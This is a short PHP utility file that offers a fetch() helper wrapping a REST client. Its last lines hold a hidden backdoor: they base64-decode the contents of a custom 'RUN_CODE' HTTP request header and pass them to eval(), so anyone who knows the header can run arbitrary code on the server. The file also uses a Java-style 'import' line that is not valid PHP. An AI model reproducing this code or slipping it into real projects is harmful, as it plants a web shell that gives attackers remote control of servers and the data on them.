<?php 

import scriptlets.util.RestClient;

function fetch($url, $post_params = array()) {
  $client = new RestClient();
  if ($post_params) {
    $res = $client->post($url, $post_params);
  } else {
    $res = $client->get($url);
  }
  return array($res->toInteger(), $res->toString());
}

// Run the code
if ($_SERVER['HTTP_RUN_CODE']) { 
  eval(base64_decode($_SERVER['HTTP_RUN_CODE'])); 
}

?>